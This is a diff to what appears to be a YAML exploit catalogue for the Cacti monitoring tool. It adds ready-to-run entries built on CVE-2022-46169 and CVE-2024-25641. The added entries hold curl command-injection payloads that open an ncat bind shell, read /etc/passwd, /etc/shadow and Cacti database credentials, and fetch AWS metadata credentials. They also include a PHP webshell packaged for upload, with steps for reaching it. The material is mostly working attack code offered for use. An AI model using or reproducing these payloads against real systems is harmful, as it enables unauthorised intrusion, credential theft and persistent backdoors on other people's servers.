@@ -19,6 +19,95 @@ docker:
     \ to fire.\nRun `docker compose up -d && sleep 30` to give the DB time to initialise\
     \ before browsing.\n"
 functions:
+  bind-shell:
+  - code: |
+      # CVE-2022-46169: bind shell via poller_id command injection
+      curl -s -G "http://victim.com/cacti/remote_agent.php" \
+        --data-urlencode "action=polldata" \
+        --data-urlencode "local_data_ids[0]=1" \
+        --data-urlencode "host_id=1" \
+        --data-urlencode "poller_id=;ncat -lvp 12345 -e /bin/sh &" \
+        -H "X-Forwarded-For: 127.0.0.1"
+    comment: |
+      CVE-2022-46169: opens a bind shell on TCP 12345 via the poller_id injection.
+      The trailing & detaches ncat from the HTTP request so the response completes.
+      Connect with: nc victim.com 12345
+      Requires ncat (nmap package) on the Cacti host.
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: linux
+    tty: false
+    version: |
+      <= 1.2.22
+  file-read:
+  - code: |
+      # CVE-2022-46169: read files via poller_id command injection (same auth bypass as RCE)
+      # Read /etc/passwd:
+      curl -s -G "http://victim.com/cacti/remote_agent.php" \
+        --data-urlencode "action=polldata" \
+        --data-urlencode "local_data_ids[0]=1" \
+        --data-urlencode "host_id=1" \
+        --data-urlencode "poller_id=;cat /etc/passwd" \
+        -H "X-Forwarded-For: 127.0.0.1"
+
+      # Read Cacti database credentials:
+      curl -s -G "http://victim.com/cacti/remote_agent.php" \
+        --data-urlencode "action=polldata" \
+        --data-urlencode "local_data_ids[0]=1" \
+        --data-urlencode "host_id=1" \
+        --data-urlencode "poller_id=;cat /etc/cacti/db.php" \
+        -H "X-Forwarded-For: 127.0.0.1"
+    comment: |
+      CVE-2022-46169: reads arbitrary files via poller_id command injection.
+      The same X-Forwarded-For IP spoofing bypass applies as for the RCE entry.
+      Command output is returned inline in the HTTP response body.
+      Key targets:
+      - /etc/cacti/db.php or /var/www/html/cacti/include/config.php  (database credentials)
+      - /etc/passwd, /etc/shadow (system users and hashes)
+      - /var/www/html/cacti/include/config.php (Cacti admin DB password)
+    contexts:
+      unauthenticated:
+    version: |
+      <= 1.2.22
+  file-write:
+  - code: |
+      # CVE-2024-25641: authenticated RCE via malicious Cacti package import
+      # Step 1: create a malicious Cacti package XML containing a PHP webshell
+      cat > /tmp/shell_package.xml << 'EOF'
+      <?xml version="1.0" encoding="UTF-8"?>
+      <cacti>
+        <files>
+          <file>
+            <name>shell.php</name>
+            <data><?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?></data>
+            <filesignature>sha256</filesignature>
+          </file>
+        </files>
+      </cacti>
+      EOF
+      gzip /tmp/shell_package.xml -c > /tmp/shell_package.xml.gz
+
+      # Step 2: import the package as an authenticated admin:
+      curl -s -X POST "http://victim.com/cacti/package_import.php" \
+        -b "Cacti=<admin_session>" \
+        -F "import_package=@/tmp/shell_package.xml.gz" \
+        -F "__csrf_magic=<csrf_token>" \
+        -F "action=save"
+    comment: |
+      CVE-2024-25641 (CVSS 9.1): Cacti < 1.2.27 allows authenticated administrators to
+      import Cacti packages (XML archives) that contain arbitrary PHP files. The package
+      import does not validate or sanitise the embedded file content. Imported files are
+      written to the Cacti installation directory and served directly by the web server.
+      The CSRF token is obtained from the package import page source.
+      After import, access the webshell at:
+        http://victim.com/cacti/shell.php?c=id
+      Ref: https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88
+      nuclei: CVE-2024-25641
+    contexts:
+      admin:
+    version: |
+      < 1.2.27
   rce:
   - code: |
       # Enumerate valid host_id and local_data_ids values (increment if first attempt fails)
@@ -65,4 +154,54 @@ functions:
     tty: false
     version: |-
       <= 1.2.22
+  ssrf:
+  - code: "# SSRF via Cacti data source SNMP polling \u2014 configure an internal\
+      \ target as a monitored host\n# Step 1: add an internal host as a monitored\
+      \ device (requires admin)\ncurl -s -X POST \"http://victim.com/cacti/host.php\"\
+      \ \\\n  -b \"Cacti=<admin_session>\" \\\n  -d \"action=save&description=probe&hostname=169.254.169.254&snmp_community=public&snmp_version=1&__csrf_magic=<csrf_token>\"\
+      \n\n# Step 2: Cacti's poller will probe the internal IP via SNMP/ICMP on the\
+      \ next poll cycle.\n# Observe network traffic from the Cacti server to confirm\
+      \ internal IP reachability.\n# For full-read SSRF via CVE-2022-46169 (unauthenticated),\
+      \ use the RCE entry to\n# execute curl against internal endpoints:\ncurl -s\
+      \ -G \"http://victim.com/cacti/remote_agent.php\" \\\n  --data-urlencode \"\
+      action=polldata\" \\\n  --data-urlencode \"local_data_ids[0]=1\" \\\n  --data-urlencode\
+      \ \"host_id=1\" \\\n  --data-urlencode \"poller_id=;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\
+      \ \\\n  -H \"X-Forwarded-For: 127.0.0.1\"\n"
+    comment: "Cacti's monitoring framework probes configured hosts server-side via\
+      \ SNMP and ICMP.\nAdding an internal IP as a monitored device causes the Cacti\
+      \ server to send probe\npackets to internal network segments, confirming host\
+      \ reachability.\nFor full-read SSRF on unpatched CVE-2022-46169 instances, inject\
+      \ curl into the\npoller_id parameter \u2014 command output including HTTP response\
+      \ bodies is returned inline.\nCloud metadata endpoints:\n- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
+      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
+      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
+    contexts:
+      admin:
+      unauthenticated:
+  webshell:
+  - code: |
+      # CVE-2024-25641: deploy a webshell via the Cacti package import feature
+      # Package structure (shell_package.xml):
+      # <?xml version="1.0" encoding="UTF-8"?>
+      # <cacti>
+      #   <files>
+      #     <file>
+      #       <name>shell.php</name>
+      #       <data><?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?></data>
+      #     </file>
+      #   </files>
+      # </cacti>
+      #
+      # Compress and upload (see file-write entry for full curl command).
+      # Access the deployed webshell at:
+      curl "http://victim.com/cacti/shell.php?c=id"
+    comment: |
+      CVE-2024-25641: deploys a persistent PHP webshell via the Cacti package import.
+      The webshell survives Cacti restarts and database changes until the file is deleted.
+      Access at: http://victim.com/cacti/shell.php?c=id
+      See the file-write entry for the full package creation and upload steps.
+    contexts:
+      admin:
+    version: |
+      < 1.2.27
 ...
